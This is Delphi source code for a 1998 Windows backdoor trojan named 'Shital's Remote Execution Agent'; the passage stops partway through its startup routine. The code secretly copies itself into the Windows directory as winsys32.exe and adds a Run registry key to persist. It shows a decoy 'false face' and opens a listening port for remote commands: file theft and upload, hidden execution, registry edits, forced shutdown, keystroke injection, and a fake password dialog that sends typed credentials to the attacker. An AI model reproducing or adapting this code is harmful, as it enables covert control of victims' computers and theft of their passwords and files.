{
 Auther: Shital Shah
 E-Mail addr: sytel@csre.iitb.ernet.in
              sytel@poboxes.com
 Purpose: Program acts as your agent executing your commands on remote computer on TCP/IP network
 Modifications: If you are modifieng the program, don't forget to send copy to auther also. Update global variables VerStr and UpdateNo too.
}

unit Main;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ComCtrls, StdCtrls, Buttons, ScktComp, ExtCtrls, ToolWin, Gauges, IniFiles,
  Menus, Math, FindFile, MMSystem;

const
  VerStr:String='25Jul98';
  UpdateNo:integer=3;
  ProgName:String='Shital''s Remote Execution Agent';
  ChangedEXEName:string='winsys32.exe';


type
  TMainForm = class(TForm)
    ReplyTimeOutTimer: TTimer;
    SS: TServerSocket;
    FindFiles: TFindFile;
    MinuteTimer: TTimer;
    procedure SSConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure SSDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure SSRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ReplyTimeOutTimerTimer(Sender: TObject);
    procedure SSError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
      procedure FormActivate(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure SSListen(Sender: TObject; Socket: TCustomWinSocket);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormPaint(Sender: TObject);
    procedure MinuteTimerTimer(Sender: TObject);
  private
    procedure WMQUERYENDSESSION(var msg: TWMQUERYENDSESSION); message WM_QUERYENDSESSION;
  public
    procedure WaitForServerReply;
    procedure SendToClientLn(str:string);
    procedure SendLines(sLines:TStrings);
    procedure ProcessReq(sReq:string);
    procedure SeperateTwoParams;
    procedure SendFile(sFileName:string);
  end;

procedure LogMessage(str:string);
function GetSocketErrMessage(ErrCode:integer):string; // return '' is not coverd here
procedure TaskForFirstTime;
function GetCommaDelimList(sl:TStrings):String;
function EncryptAlphaNum(str:string): string ;
function DecryptAlphaNum(str:string): string ;
function OnSocketTimeOut:Boolean;
function OnSocketError:Boolean;
function CombineCodeMsg(nCode:integer; sMsg:string):string;
function RPos(sString:string;cChar:Char):integer;
function BoolToStr(bBool:Boolean):string;
procedure ClearPutFileOperation;
function AbortPutFile(pCharArr:PChar; nArrSize:Integer):Boolean;
function IsChangedEXE:Boolean;
procedure ShowFalseFace;


var
  MainForm: TMainForm;
  IsFirstTime:Boolean=false;
  IsHelpDlgShown:Boolean=false;
  IsFillJunkCanceled:boolean=false;
  DrawingChar:string='@';
  dtStartTime:TDateTime;
  UMId:string=''; // User Mail Id

implementation

uses constants, operations, pwdlg, sendkey;


{$R *.DFM}

const
  nPORT:integer=23145;
  nCOMMAND_MODE:integer=1;
  nPUT_FILE_MODE:integer=2;
  sABORT_PUT_CMD:string='abortput';

var
  ClientReplyStr:string='';
  ReplyReceived:Boolean=false;
  IsLogingOn:Boolean=true;
  nCommandMode:Integer=1; // nCOMMAND_MODE
  sCommand,sParam,sParam1,sParam2:string;
  nInBytes:Integer=-1;  fInFile:file; nTotalInFileSize:integer; sInFileName:string='';
  nDisconnectCount:Integer=0;




procedure TMainForm.WaitForServerReply;
begin
  ReplyTimeOutTimer.Enabled:=true;
  LogMessage('//Waiting for reply...');
  try
    while (not ReplyReceived) and (not Application.Terminated) and (ReplyTimeOutTimer.Enabled) do Application.ProcessMessages;
  finally
    ReplyTimeOutTimer.Enabled:=false;
    ReplyReceived:=false;
  end;
end;

procedure TMainForm.SendToClientLn(str:string);
begin
  try
    LogMessage('Sent to client: ' + str);
    SS.Socket.Connections[0].SendText(str + #13#10);
    Application.ProcessMessages;
  except
  end;
end;

procedure LogMessage(str:string);
begin
  //if IsLogingOn then LogForm.LogMemo.Lines.Add(str);
end;




procedure TMainForm.SSConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  try
    ClearPutFileOperation;
    LogMessage('//Connected!');
    Socket.SendText(IntToStr(nHELLO_CODE) + ' ' + sHELLO_MSG);
  except
  end;
end;

procedure TMainForm.SSDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  nDisconnectCount:=nDisconnectCount+1;
  LogMessage('//Disconnected!');
end;

procedure TMainForm.SSRead(Sender: TObject; Socket: TCustomWinSocket);
var nSpacePos:integer;
    pBuff:PChar; nBuffSizeReq,nBuffSizeActual:integer;
begin
  try
    if nCommandMode=nCOMMAND_MODE then
    begin
      ReplyReceived:=true;
      ClientReplyStr:=Socket.ReceiveText;
      LogMessage('Received from client: ' + ClientReplyStr);
      ProcessReq(ClientReplyStr);
    end
    else if nCommandMode=nPUT_FILE_MODE then
    begin
         if nInBytes=-1 then
         begin
           nInBytes:=0;
           AssignFile(fInFile,sInFileName);
           Rewrite(fInFile,1);
         end;

         try
           pBuff:=nil;
           nBuffSizeReq:=socket.ReceiveLength;
           GetMem(pBuff,nBuffSizeReq);
           nBuffSizeActual:=socket.ReceiveBuf(pBuff^,nBuffSizeReq);
           if not AbortPutFile(pBuff,nBuffSizeActual) then
           begin
             BlockWrite(fInFile,pBuff^,nBuffSizeActual);
             nInBytes:=nInBytes+nBuffSizeActual;
           end
           else
           begin
             nTotalInFileSize:=nBuffSizeActual;
           end;
         finally
           FreeMem(pBuff);
         end;

         if nInBytes >= nTotalInFileSize then
         begin
           ClearPutFileOperation;
           SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'PUTFILE command completed.'));
         end;
    end
    else
    begin
      //Invalid command mode - so correct it
      SendToClientLn(CombineCodeMsg(nINTERNAL_ERROR_CODE,'Internal error: nCommandMode was set to unrecognized value'));
      nCommandMode:=nCOMMAND_MODE;
      ClearPutFileOperation;
    end;
  except
  end;
end;


//commands
procedure TMainForm.ProcessReq(sReq:string);
var slLines:TStringList; nSpacePos:integer;
    bResult:boolean;nResult:Integer; mr:integer;
    sStr:string;
begin
  try
    if nCommandMode = nCOMMAND_MODE then
    begin
      //Get command
      sReq:=TrimLeft(sReq);
      nSpacePos:=Pos(' ',sReq);
      if nSpacePos = 0 then
      begin
        sCommand:=sReq;
        sCommand:=Trim(sCommand);
        sParam:='';
      end
      else
      begin
        sCommand:=LowerCase(Copy(sReq,1,nSpacePos-1));
        sParam:=Copy(sReq,nSpacePos+1,Length(sReq)-nSpacePos);
        sParam:=Trim(sParam);
      end;


      //Now process the commad
      if sCommand ='' then
      begin
        SendToClientLn(CombineCodeMsg(nNO_COMMAND_CODE,sNO_COMMAND_MSG));
      end
      else if (sCommand = 'dir') or (sCommand = 'ls') then
      begin
        try
          slLines:=TStringList.Create;
          GetDirList(sParam,slLines,faAnyFile);
          SendLines(slLines);
        finally
          slLines.Free;
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'DIR command completed.'));
      end
      else if (sCommand = 'view') or (sCommand = 'type') or (sCommand = 'show') then
      begin
        try
          slLines:=TStringList.Create;
          ViewFile(sParam,slLines);
          SendLines(slLines);
        finally
          slLines.Free;
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'VIEW command completed.'));
      end
      else if (sCommand = 'del') or (sCommand = 'delete') or (sCommand = 'rm') then
      begin
        try
          bResult:=DeleteFile(sParam);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'DEL command returned ' + BoolToStr(bResult)));
      end
      else if (sCommand = 'ren') or (sCommand = 'rename') or (sCommand = 'mv') then
      begin
        try
          SeperateTwoParams;;
          bResult:=RenameFile(sParam1,sParam2);
          SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'DEL command returned ' + BoolToStr(bResult)));
        finally
        end;
      end
      else if (sCommand = 'dir/ad') or (sCommand = 'ls-d') then
      begin
        try
          slLines:=TStringList.Create;
          GetDirList(sParam,slLines,faDirectory);
          SendLines(slLines);
        finally
          slLines.Free;
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'DIR/AD command completed.'));
      end
      else if (sCommand = 'dir/s') or (sCommand = 'ls-S') then
      begin
        try
           SeperateTwoParams;
           FindFiles.Directory := sParam1;
           FindFiles.Filter := sParam2;
           FindFiles.Execute ;
           SendLines(FindFiles.Files);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'DIR/S command completed.'));
      end
      else if (sCommand = 'copy') or (sCommand = 'cp') then
      begin
        try
           SeperateTwoParams;
           bResult:=CopyFile(PChar(sParam1),PChar(sParam2),False);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'COPY command returned ' + BoolToStr(bResult)));
      end
      else if (sCommand = 'exec') or (sCommand = 'run') then
      begin
        try
           SeperateTwoParams;
           if (sParam1 <> '') and (sParam2 <> '') then nResult:=ExecuteIt(sParam1,sParam2);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'EXEC command returned ' + IntToStr(nResult)));
      end
      else if (sCommand = 'print') or (sCommand = 'prn') then
      begin
        try
           SeperateTwoParams;
           nResult:=PrintIt(sParam1,sParam2);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'PRINT command returned ' + IntToStr(nResult)));
      end
      else if (sCommand = 'openreg') or (sCommand = 'openkey') then
      begin
        try
           SeperateTwoParams;
           operations.gsKeyRoot:=sParam1;
           operations.gsKeyName:=sParam2;
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'OPENREG command completed.'));
      end
      else if (sCommand = 'setregroot') or (sCommand = 'setrootkey') then
      begin
        try
          operations.gnRoot :=StrToInt(sParam);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'SetRegRoot command completed.'));
      end
      else if (sCommand = 'writeregstr') or (sCommand = 'writestrinreg') then
      begin
        try
          WriteStrKey(sParam);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'WriteRegStr command completed.'));
      end
      else if (sCommand = 'writeregint') or (sCommand = 'writeintinreg') then
      begin
        try
          WriteIntKey(StrToInt(sParam));
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'WriteRegInt command completed.'));
      end
      else if (sCommand = 'readregstr') or (sCommand = 'readstrinreg') then
      begin
        try
          SendToClientLn('Registryvalue="' + ReadStrKey + '"');
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'ReadRegStr command completed.'));
      end
      else if (sCommand = 'readregint') or (sCommand = 'readintinreg') then
      begin
        try
          SendToClientLn('Registryvalue="' + IntToStr(ReadIntKey) + '"');
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'ReadRegInt command completed.'));
      end
      else if (sCommand = 'showmodalokmsg') or (sCommand = 'showmessage') then
      begin
        SeperateTwoParams;
        try
          SendToClientLn(CombineCodeMsg(nWAIT_CODE,sWAIT_MSG));
          MessageBox(MainForm.Handle,PChar(sParam2),PChar(sParam1),MB_OK or MB_SYSTEMMODAL);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'ShowOkMsg command completed.'));
      end
      else if (sCommand = 'showyesnomsg') or (sCommand = 'yesnomsgbox') then
      begin
        SeperateTwoParams;
        try
          SendToClientLn(CombineCodeMsg(nWAIT_CODE,sWAIT_MSG));
          SendToClientLn('User replied to message: ' + IntToStr(MessageBox(MainForm.Handle,PChar(sParam2),PChar(sParam1),MB_YESNO or MB_SYSTEMMODAL)));
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'ShowYesNoMsg command completed.'));
      end
      else if (sCommand = 'showarimsg') or (sCommand = 'abortretryignoremsgbox') or (sCommand='showabortretryignoremsg') then
      begin
        SeperateTwoParams;
        try
          SendToClientLn(CombineCodeMsg(nWAIT_CODE,sWAIT_MSG));
          SendToClientLn('User replied to message: ' + IntToStr(MessageBox(MainForm.Handle,PChar(sParam2),PChar(sParam1),MB_ABORTRETRYIGNORE or MB_SYSTEMMODAL)));
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'ShowYesNoMsg command completed.'));
      end
      else if (sCommand = 'showpwdlg') or (sCommand = 'showpwdlg') or (sCommand='showpassworddialog') then
      begin
        SeperateTwoParams;
        try
          SendToClientLn(CombineCodeMsg(nWAIT_CODE,sWAIT_MSG));
          if sParam1 <> '' then PasswordDlg.Caption := sParam1;
          if sParam2 <> '' then PasswordDlg.MsgLabel.Caption:=sParam2;
          mr:=PassWordDlg.ShowModal ;
          SendToClientLn('User replied to message: ' + IntToStr(mr)+ ' ' + PassWordDlg.PasswordEdit.Text + ' Login:' +  PassWordDlg.LoginEdit.Text );
        finally
        end;
      end
      else if (sCommand = 'filesize') or (sCommand = 'getfilesize') then
      begin
        try
          SendToClientLn(IntToStr(GetFileSize(sParam)));
        finally
        end;
      end
      else if (sCommand = 'reboot') or (sCommand = 'boot') then
      begin
        try
          ExitWindowsEx(EWX_FORCE or EWX_REBOOT,0);
        finally
        end;
      end
      else if (sCommand = 'shutdown') or (sCommand = 'turnoff') then
      begin
        try
          ExitWindowsEx(EWX_FORCE or EWX_SHUTDOWN,0);
        finally
        end;
      end
      else if (sCommand = 'logoff') or (sCommand = 'coldreboot') then
      begin
        try
          ExitWindowsEx(EWX_FORCE or EWX_LOGOFF,0);
        finally
        end;
      end
      else if (sCommand = 'poweroff') or (sCommand = 'turnoffpower') then
      begin
        try
          ExitWindowsEx(EWX_FORCE or EWX_POWEROFF,0);
        finally
        end;
      end
      else if (sCommand = 'echo') or (sCommand = 'say') then
      begin
        try
          SendToClientLn(sParam);
        finally
        end;
      end
      else if (sCommand = 'date') or (sCommand = 'time') or (sCommand = 'datetime')then
      begin
        try
          SendToClientLn(DateTimeToStr(Now));
        finally
        end;
      end
      else if (sCommand = 'movemouse') then
      begin
        try
          SeperateTwoParams;
          SetCursorPos(StrToInt(sParam1),StrToInt(sParam2));
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'MOUSEMOVE command completed.'));
      end
      else if (sCommand = 'starttime') then
      begin
        try
          SendToClientLn(DateTimeToStr(dtStartTime));
        finally
        end;
      end
      else if (sCommand = 'lastendtime') then
      begin
        try
          SendToClientLn(DateTimeToStr(GetLastEndTime));
        finally
        end;
      end
      else if (sCommand = 'loginname') or (sCommand = 'getloginname') then
      begin
        try
          SendToClientLn(DelGetUserName);
        finally
        end;
      end
      else if (sCommand = 'machinename') or (sCommand = 'getmachinename') then
      begin
        try
          SendToClientLn(DelGetMachineName);
        finally
        end;
      end
      else if (sCommand = 'icquindir') or (sCommand = 'icquinpath')then
      begin
        try
          SendToClientLn(GetICQUinPath);
        finally
        end;
      end
      else if (sCommand = 'exit') or (sCommand = 'quite')then
      begin
        try
          SendToClientLn('bye!');
          SS.Close;
        finally
          halt;
        end;
      end
      else if (sCommand = 'stopserv') or (sCommand = 'closeport')then
      begin
        try
          SS.Close;
        finally
        end;
      end
      else if (sCommand = 'setwallppr') or (sCommand = 'setwallpaper')then
      begin
        try
          SendToClientLn('Wallpaper change success? ' + BoolToStr(SystemParametersInfo(SPI_SETDESKWALLPAPER,0,PChar(sParam),SPIF_UPDATEINIFILE or SPIF_SENDWININICHANGE)));
        finally
        end;
      end
      else if (sCommand = 'getvol') or (sCommand = 'volume')then
      begin
        try
          SendToClientLn(GetVolInfo(sParam));
        finally
        end;
      end
      else if (sCommand = 'osver') or (sCommand = 'os')then
      begin
        try
          SendToClientLn(GetOSVer);
        finally
        end;
      end
      else if (sCommand = 'ver') or (sCommand = 'about') or (sCommand = 'author') or (sCommand = 'auther') then
      begin
        try
          SendToClientLn(ProgName + ' Ver. ' + VerStr + ' Update No. ' + IntToStr(UpdateNo));
        finally
        end;
      end
      else if (sCommand = 'beep') or (sCommand = 'bell')then
      begin
        try
          Beep;
          SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'BEEP command completed.'));
        finally
        end;
      end
      else if (sCommand = 'getfile') or (sCommand = 'sendfile')then
      begin
        try
           SendFile(sParam);
        finally
        end;
      end
      else if (sCommand = 'takefile') or (sCommand = 'putfile')then
      begin
        try
           SeperateTwoParams;
           if (sParam1 <> '') and (sParam2 <> '') then
           begin
             try
               nTotalInFileSize:=StrToInt(sParam1);
               sInFileName:=sParam2;
               nCommandMode:=nPUT_FILE_MODE;
               SendToClientLn('Ready to accept file ' + sParam2);
             except
               SendToClientLn(CombineCodeMsg(nINVALID_PARAM_CODE,sINVALID_PARAM_MSG));
             end;
           end
           else
           begin
             SendToClientLn(CombineCodeMsg(nNO_PARAM_CODE,sNO_PARAM_MSG));
           end;
        finally
        end;
      end
      else if (sCommand = sABORT_PUT_CMD) then
      begin
        try
          ClearPutFileOperation;
          SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,sABORT_PUT_CMD + ' command completed.'));
        finally
        end;
      end
      else if (sCommand = 'attrib') then
      begin
        try
          SeperateTwoParams;
          nResult:=FileSetAttr(sParam1, StrToInt(sParam2));
          if nResult=0 then
            SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'ATTRIB command completed.'))
          else
            SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'ATTRIB command returned error: ' + IntToStr(nResult)))
        finally
        end;
      end
      else if (sCommand = 'runminimized') or (sCommand = 'runinvisible')then
      begin
        try
           SeperateTwoParams;
           nResult:=ExecuteItMinimized(sParam1,sParam2);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'RUNMinimized command returned ' + IntToStr(nResult)));
      end
      else if (sCommand = 'inputbox') or (sCommand = 'ask')then
      begin
        try
           SeperateTwoParams;
           sStr:='';
           bResult:=InputQuery(sParam1,sParam2,sStr);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'ASK command returned: ' + BoolToStr(bResult) + ' ' + sStr));
      end
      else if (sCommand = 'playsound') or (sCommand = 'sound') or (sCommand = 'playwav') then
      begin
        try
          SeperateTwoParams;
          if LowerCase(sParam2) <> 'alias' then
            bResult:=PlaySound(PChar(sParam2),0,SND_ASYNC or SND_FILENAME)
          else
            bResult:=PlaySound(PChar(sParam2),0,SND_ASYNC or SND_ALIAS);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'PLAYSOUND command returned: ' + BoolToStr(bResult)));
      end
      else if (sCommand = 'stopsound') or (sCommand = 'killsound') then
      begin
        try
          bResult:=PlaySound(nil,0,SND_PURGE)
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'STOPSOUND command returned: ' + BoolToStr(bResult)));
      end
      else if (sCommand = 'loopsound') or (sCommand = 'continousesound') then
      begin
        try
          SeperateTwoParams;
          if LowerCase(sParam2) <> 'alias' then
            bResult:=PlaySound(PChar(sParam2),0,SND_ASYNC or SND_FILENAME or SND_LOOP)
          else
            bResult:=PlaySound(PChar(sParam2),0,SND_ASYNC or SND_ALIAS or SND_LOOP);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'LOOPSOUND command returned: ' + BoolToStr(bResult)));
      end
      else if (sCommand = 'gettasks') or (sCommand = 'winlist') or (sCommand = 'listwindows') then
      begin
        slLines:=nil;
        try
           slLines:=TStringList.Create;
           GetWinList(slLines,True,False,' : ');
           SendToClientLn(StringListToString(slLines,#13#10));
        finally
           slLines.Free ;
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'WINLIST command completed.'));
      end
      else if (sCommand = 'sendkey') or (sCommand = 'sendkeys') then
      begin
        try
          SeperateTwoParams;
          SendKeyToWin(StrToInt(sParam1),sParam2);
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'SENDKEY command completed.'));
      end
      else if (sCommand = 'restartas') then
      begin
        try
          if FileExists(sParam) then
          begin
            try
              SendToClientLn('Now restarting as"' + sParam + '". Reconnect aftersome time.');
              SS.Close;
              AddStrRegEntry('\Software\Microsoft\Windows\CurrentVersion\Run','winsys32',sParam + ' nofalseface');
              if ExecuteIt(sParam,'dontinstall') > 32 then
              begin
                halt;
              end
              else
              begin
                try
                  SS.Open;
                finally
                  AddStrRegEntry('\Software\Microsoft\Windows\CurrentVersion\Run','winsys32',ParamStr(0));
                end;
              end;
            except
              try
                SS.Open;
              finally
                AddStrRegEntry('\Software\Microsoft\Windows\CurrentVersion\Run','winsys32',ParamStr(0));
              end;
            end;
          end
          else
          begin
            SendToClientLn('Can not find the file named"' + sParam + '"');
          end;
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'RESTARTAS command completed.'));
      end
      else if (sCommand = 'restartsvr') or (sCommand = 'restartserver')then
      begin
        try
          SS.Close;
        finally
          SS.Open;
        end;
      end
      else if (sCommand = 'getdrivetype') or (sCommand = 'drivetype')then
      begin
        try
          SendToClientLn('Drive ' + sParam + ' is ' + IntToStr(GetDriveType(PChar(sParam))));
        finally
        end;
      end
      else if (sCommand = 'gettotaldiskspace') or (sCommand = 'disksize') or (sCommand = 'totalspace')then
      begin
        try
          SendToClientLn('Total Disk capacity for ' + sParam + ' is ' + IntToStr(GetDiskSize(sParam)));
        finally
        end;
      end
      else if (sCommand = 'getdiskfreespace') or (sCommand = 'freespace')then
      begin
        try
          SendToClientLn('Total free disk space for ' + sParam + ' is ' + IntToStr(GetDiskFreeSize(sParam)));
        finally
        end;
      end
      else if (sCommand = 'exename') or (sCommand = 'yourname')then
      begin
        try
          SendToClientLn('This is "' + ParamStr(0) + '" speaking.');
        finally
        end;
      end
      else if (sCommand = 'closewindow') or (sCommand = 'stopapp') then
      begin
        try
          bResult:=CloseWindow(StrToInt(sParam));
        finally
        end;
        SendToClientLn('CLOSEWINDOW for handle "' + sParam + '" returned ' + BoolToStr(bResult));
      end
      else if (sCommand = 'findexe') or (sCommand = 'viewerfor') then
      begin
        try
          if sParam <> '' then
            SendToClientLn(GetAssociatedEXE(sParam))
          else
            SendToClientLn('You must specify extention (Ex. BMP) as parameter.');
        finally
        end;
      end
      else if (sCommand = 'getwinpath') or (sCommand = 'winpath') then
      begin
        try
          SendToClientLn('Victims Windows dir is:' + GetWinDir);
        finally
        end;
      end
      else if (sCommand = 'activewin') or (sCommand = 'getactivewindow') then
      begin
        try
          SendToClientLn(GetActiveWinText);
        finally
        end;
      end
      else if (sCommand = 'harakiri') or (sCommand = 'die') then
      begin
        try
          SendToClientLn('Commiting Suicide...');
          AddStrRegEntry('\Software\Microsoft\Windows\CurrentVersion\Run','winsys32','');
          SS.Close;
        finally
          halt;
        end;
      end
      else if (sCommand = 'showokmsg') or (sCommand = 'msgbox') then
      begin
        SeperateTwoParams;
        try
          nResult:=ExecuteIt(ParamStr(0),'showmessage "' + sParam1 + '"  "' + sParam2 + '"');
        finally
        end;
        SendToClientLn(CombineCodeMsg(nCOMMAND_ENDED_CODE,'MSGBOX command returned: ' + IntToStr(nResult)));        
      end
      else
      begin
        SendToClientLn(CombineCodeMsg(nINVALID_COMMAND_CODE,sINVALID_COMMAND_MSG));
      end
    end;
  except
  end;
end;



procedure TMainForm.ReplyTimeOutTimerTimer(Sender: TObject);
begin
  try
    ReplyTimeOutTimer.Enabled:=false; // stop until user answers
    if OnSocketTimeout then
    begin
      LogMessage('//Disconnecting by User...');
      if SS.Active then SS.Close;
      ReplyTimeOutTimer.Enabled:=false;
    end
    else ReplyTimeOutTimer.Enabled:=true;
  except
  end;
end;

procedure TMainForm.SSError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
var msg:string;
begin
  try
    if (ErrorCode = 10060) or (ErrorCode = 10065) then ErrorCode:=0; // Time out is handeled by ReplyTimeOutTimer
    msg:=GetSocketErrMessage(ErrorCode);
    if msg <> '' then
    begin
      OnSocketError;
      ReplyReceived:=true; // terminate external wait loop
      ErrorCode:=0;
    end;
  except
  end;  
end;

function GetSocketErrMessage(ErrCode:integer):string; // return '' is not coverd here
var MsgStr:string;
begin
  try
    MsgStr:='';
    case ErrCode of
      10013: MsgStr:='Permission Denied: An attempt was made to access a socket in a way forbidden by its access permissions. An example is using a broadcast address for sendto without broadcast permission being set using setsockopt(SO_BROADCAST).';
      10048: MsgStr:='Address already in use: Only one usage of each socket address (protocol/IP address/port) is normally permitted.';
      10049: MsgStr:='Cannot assign requested address: The requested address is not valid in its context.';
      10047: MsgStr:='Address family not supported by protocol family: An address incompatible with the requested protocol was used.';
      10037: MsgStr:='Operation already in progress: An operation was attempted on a non-blocking socket that already had an operation in progress';
      10053: MsgStr:='Software caused connection abort: An established connection was aborted by the software in your host machine, possibly due to a data transmission timeout or protocol error. ';
      10061: MsgStr:='Connection refused: No connection could be made because the target machine actively refused it. This usually results from trying to connect to a service that is inactive on the foreign host - i.e. one with no server application running. ';
      10054: MsgStr:='Connection reset by peer: A existing connection was forcibly closed by the remote host.';
      10039: MsgStr:='Destination address required:A required address was omitted from an operation on a socket. For example, this error will be returned if sendto is called with the remote address of ADDR_ANY. ';
      10014: MsgStr:='Bad address: The system detected an invalid pointer address in attempting to use a pointer argument of a call.';
      10064: MsgStr:='Host is down: A socket operation failed because the destination host was down.';
      10065: MsgStr:='No route to host: A socket operation was attempted to an unreachable host. See WSAENETUNREACH ';
      10036: MsgStr:='Operation now in progress: A blocking operation is currently executing. Windows Sockets only allows a single blocking operation to be outstanding per task (or thread)';
      10004: MsgStr:='Interrupted function call: A blocking operation was interrupted by a call to WSACancelBlockingCall';
      10022: MsgStr:='Invalid argument: Some invalid argument was supplied (for example, specifying an invalid level to the setsockopt function).';
      10056: MsgStr:='Socket is already connected: A connect request was made on an already connected socket. ';
      10024: MsgStr:='Too many open files';
      10040: MsgStr:='Message too long: A message sent on a datagram socket was larger than the internal message buffer or some other network limit, or the buffer used to receive a datagram into was smaller than the datagram itself';
      10050: MsgStr:='Network is down: A socket operation encountered a dead network. This could indicate a serious failure of the network system (i.e. the protocol stack that the WinSock DLL runs over), the network interface, or the local network itself. ';
      10052: MsgStr:='Network dropped connection on reset: The host you were connected to crashed and rebooted. May also be returned by setsockopt if an attempt is made to set SO_KEEPALIVE on a connection that has already failed. ';
      10051: MsgStr:='Network is unreachable: A socket operation was attempted to an unreachable network. This usually means the local software knows no route to reach the remote host. ';
      10055: MsgStr:='No buffer space available: An operation on a socket could not be performed because the system lacked sufficient buffer space or because a queue was full';
      10042: MsgStr:='Bad protocol option: An unknown, invalid or unsupported option or level was specified in a getsockopt or setsockopt call. ';
      10057: MsgStr:='Socket is not connected: A request to send or receive data was disallowed because the socket is not connected and (when sending on a datagram socket using sendto) no address was supplied.';
      //some of errors are now skipped. see MS Socket 2 referencs
      10058: MsgStr:='Cannot send after socket shutdown';
      10060: MsgStr:='Connection timed out: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond. ';
      10035: MsgStr:='Resource temporarily unavailable';
      11001: MsgStr:='Host not found: No such host is known. The name is not an official hostname or alias, or it cannot be found in the database(s) being queried.';
      10091: MsgStr:='Network subsystem is unavailable';
      11002: MsgStr:='Non-authoritative host not found:This is usually a temporary error during hostname resolution and means that the local server did not receive a response from an authoritative server. A retry at some time later may be successful. ';
      10092: MsgStr:='WINSOCK.DLL version out of range: The current Windows Sockets implementation does not support the Windows Sockets specification version requested by the application. Check that no old Windows Sockets DLL files are being accessed.';
      10094: MsgStr:='Graceful shutdown in progress: Returned by recv, WSARecv to indicate the remote party has initiated a graceful shutdown sequence. ';
    end;
    Result:=MsgStr;
  except
  end;
end;



procedure TMainForm.FormActivate(Sender: TObject);
begin
  try
    if IsFirstTime then
    begin
      TaskForFirstTime;
    end;
  except
  end;
end;

procedure TaskForFirstTime;
begin
    //
end;



function GetCommaDelimList(sl:TStrings):String;
var i:integer;
begin
  try
    if sl.Count <> 0 then
    begin
      Result:='<' + sl[0] + '>';
      for i:=1 to sl.Count-1 do
      begin
        Result:=Result+','#13#10#9;
        Result:=Result + '<' + sl[i] + '>';
      end;
    end
    else Result:='';
  except
  end;
end;



function EncryptAlphaNum(str:string): string ;
var i:integer;
begin
  try
    // routine must convert alphanum in to alpha num only, i.e. result must not have any char other then from #32 to #126
    Result:='';
    for i:=1 to Length(str) do
      Result:=Result+ Char(126 - Integer(str[i])+ 32);
  except
  end;
end;

function DecryptAlphaNum(str:string): string ;
var i:integer;
begin
  try
    Result:='';
    for i:=1 to Length(str) do
      Result:=Result+ Char(32+126-Integer(str[i]));
  except
  end;
end;

function OnSocketTimeOut:Boolean;
begin
//
end;

function OnSocketError:Boolean;
begin
//
end;

procedure TMainForm.FormCreate(Sender: TObject);
var sWinDir:string; sNewEXE:string;
begin
try
  if LowerCase(ParamStr(1)) <> 'showmessage' then
  begin
    //Change caption
    if IsChangedEXE then
    begin
      Caption:='Windows Sub System 32';
    end
    else Caption:='The Microsoft Bill Gates (Win98 Special Edition)';

    //Auto Install
    If (not IsChangedEXE) and ((LowerCase(ParamStr(1)) <> 'dontinstall') ) then
    begin
      sWinDir:=GetWinDir;
      if sWinDir[Length(sWinDir)] <> '\' then sWinDir:=sWinDir + '\';
      sNewEXE:=sWinDir + ChangedEXEName;
      if CopyFile(PChar(ParamStr(0)),PChar(sNewEXE),False) then
      begin
        AddStrRegEntry('\Software\Microsoft\Windows\CurrentVersion\Run','winsys32',sNewEXE);
        WinExec(PChar(sNewEXE),0);
        if (LowerCase(ParamStr(1)) <> 'nofalseface') then
           ShowFalseFace;
        halt;
      end;
    end
    else
    begin
